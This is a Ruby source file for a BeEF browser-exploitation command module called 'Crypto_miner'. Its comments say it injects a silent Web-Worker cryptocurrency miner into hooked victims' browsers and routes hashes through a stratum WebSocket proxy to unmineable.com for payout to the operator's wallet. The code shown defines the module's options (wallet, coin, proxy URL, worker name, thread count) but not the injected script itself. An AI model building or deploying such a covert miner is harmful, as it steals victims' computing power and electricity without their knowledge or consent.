#
# Crypto Web Miner – BeEF command module
# Injects a silent Web-Worker-based miner into the hooked browser.
# The worker connects to the local stratum-ws proxy (deploy.sh sets it up)
# which forwards to unmineable.com and converts hashes to your chosen coin.
#
class Crypto_miner < BeEF::Core::Command
  def self.options
    cfg = BeEF::Core::Configuration.instance

    default_wallet = cfg.get('beef.extension.hookpages.miner.wallet') || 'YOUR_SOLANA_WALLET_HERE'
    default_coin   = cfg.get('beef.extension.hookpages.miner.coin')   || 'SOL'
    default_proxy  = cfg.get('beef.extension.hookpages.miner.ws_proxy') || 'wss://YOUR_SERVER/miner-ws'
    default_worker = cfg.get('beef.extension.hookpages.miner.worker_name') || 'beef_hook'
    default_threads = (cfg.get('beef.extension.hookpages.miner.threads') || 2).to_s

    [
      {
        'name'        => 'wallet',
        'description' => 'Your wallet address for the target coin',
        'ui_label'    => 'Wallet Address',
        'value'       => default_wallet
      },
      {
        'name'        => 'coin',
        'description' => 'Coin to mine (SOL, ETH, BTC, DOGE, ...)',
        'ui_label'    => 'Coin Symbol',
        'value'       => default_coin
      },
      {
        'name'        => 'ws_proxy',
        'description' => 'WebSocket stratum proxy URL (set up by deploy.sh)',
        'ui_label'    => 'Stratum-WS Proxy URL',
        'value'       => default_proxy
      },
      {
        'name'        => 'worker_name',
        'description' => 'Worker name shown on unmineable dashboard',
        'ui_label'    => 'Worker Name',
        'value'       => default_worker
      },
      {
        'name'        => 'threads',
        'description' => 'Number of mining threads (1-4)',
        'ui_label'    => 'Threads',
        'value'       => default_threads
      }
    ]
  end

  def post_execute
    save({ 'result' => @datastore['result'] })
  end
end
